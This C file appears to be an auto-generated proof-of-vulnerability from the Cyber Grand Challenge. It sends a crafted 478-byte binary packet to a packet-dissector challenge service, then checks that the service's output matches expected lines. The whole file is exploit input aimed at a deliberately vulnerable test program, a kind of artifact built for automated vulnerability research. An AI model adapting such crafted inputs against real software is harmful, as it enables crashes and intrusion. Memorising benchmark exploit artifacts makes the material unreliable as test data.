#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\xde\x01\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xc6\x01\x00\x00\xbe\x01\x00\x00"
         "\x00\x00\x00\x00\x10\x01\x10\x10\x00\x00\x00\x00\xbe\x01\x00\x00"
         "\x06\x54\x9e\x86\xf7\xef\x74\x86\x20\x00\x55\x14\xd3\x6e\x62\xa4"
         "\xed\xce\x47\xaf\x27\x00\x00\x00\x01\x9e\x7a\x41\xe0\x37\x82\x9d"
         "\x59\xae\xc9\x24\x48\xfb\xd5\x11\x5b\xaa\x41\x00\x74\xa1\x9f\x66"
         "\x41\x00\x67\x39\x01\x31\xa3\x48\xe4\xa0\xd4\x23\xe5\x75\x49\x01"
         "\x8c\x92\x01\x00\x19\x6e\x4e\x8d\xc4\xf1\x90\x89\x08\x01\x79\xcf"
         "\x8c\x53\x83\xe3\x12\xa3\x0f\x48\x90\xc9\x18\xf5\x8b\x66\x6e\x01"
         "\x75\x23\x16\x04\xb3\x57\x50\x88\x3c\xc4\x58\xce\x47\x50\x22\xc0"
         "\x82\x27\x34\xd2\x23\x8a\x57\x73\x3a\x32\xd3\x01\x00\x13\x88\xb4"
         "\xf6\x6a\xc2\x89\xc6\x90\xab\xa4\xd0\x0a\xff\xd0\x29\x56\x35\x59"
         "\x8f\x9b\xa3\xdd\x93\x76\xb0\xd0\xc3\x33\x29\x82\x74\xaa\x99\x58"
         "\xac\xe9\x4d\xa4\x2d\x93\xe0\x3f\x97\x25\x1f\x29\xfe\xd7\x5a\xab"
         "\x78\xb3\xb2\x7d\x65\xeb\x45\xa0\xa1\x66\xc5\xa7\x69\xe7\x7b\x5f"
         "\x22\x6b\x0c\x03\xc2\x75\x05\x24\x60\x02\x78\x5d\x52\xaa\x0e\x8b"
         "\xa6\xd9\x88\x55\x39\x73\x98\x00\x81\xd3\x2d\xb1\x04\x92\x68\x57"
         "\x37\x6d\xb3\xbe\xbf\x38\x79\x8c\xa5\x6c\x40\x3c\xd8\xda\xb1\x03"
         "\x36\xe3\xb9\x11\xe1\xd1\x8c\x2c\x2d\xca\x98\xb2\xf1\x65\x44\xe8"
         "\xf7\xf4\x5f\xfc\xe2\xc7\xca\x66\x2d\xc0\xd9\xd7\x8d\xe4\x1b\xf4"
         "\x02\xb0\x5a\x77\x9d\x35\xbb\xa0\xf2\x94\x00\x75\x29\xfa\x0b\xbb"
         "\x83\x26\x51\xc7\x88\x15\xc9\x05\xb0\xbc\x3c\xc0\x97\x62\xf5\x31"
         "\xc2\xd0\xe6\xb1\x71\x01\x2a\x24\x1c\x44\xe3\xbd\x26\xe4\x69\x42"
         "\x7c\x09\x9b\xf4\xd9\x9a\x99\x47\x70\xef\x71\x75\x1d\x6c\x9e\x81"
         "\xe4\xd5\x94\x4c\xbf\x10\xa9\x4b\xb7\x58\xf9\x8c\xc2\xd9\x8e\x22"
         "\x3d\x37\xc3\x53\x19\x48\xcb\x4b\x30\x8a\x21\xc7\x4b\x06\x87\x7b"
         "\xaa\x24\xbf\x2b\x33\x1d\x92\x9a\xee\x9b\x39\xe7\xde\x7c\xf7\x5c"
         "\xcf\x3e\x75\x0c\xe2\x90\x73\xb7\xf0\x62\x41\x00\x01\x00\xc2\x01"
         "\x00\xbd\x28\xfa\xbd\x9a\x84\xf9\x45\x96\x20\xf9\x80\x2f\x6d\xbc"
         "\x02\xcf\x49\x1b\xac\x24\x71\x10\x01\xaf\x01\x00\x76\xee\x41\x00"
         "\x41\x00\x7f\x31\x6c\xbf\x41\x00\x01\x00\x8a\x01\x00\x1c";
      static unsigned int write_00001_00000_len = 478;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===llama
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===llamadecoke
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61\x64\x65\x63\x6f\x6b\x65";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
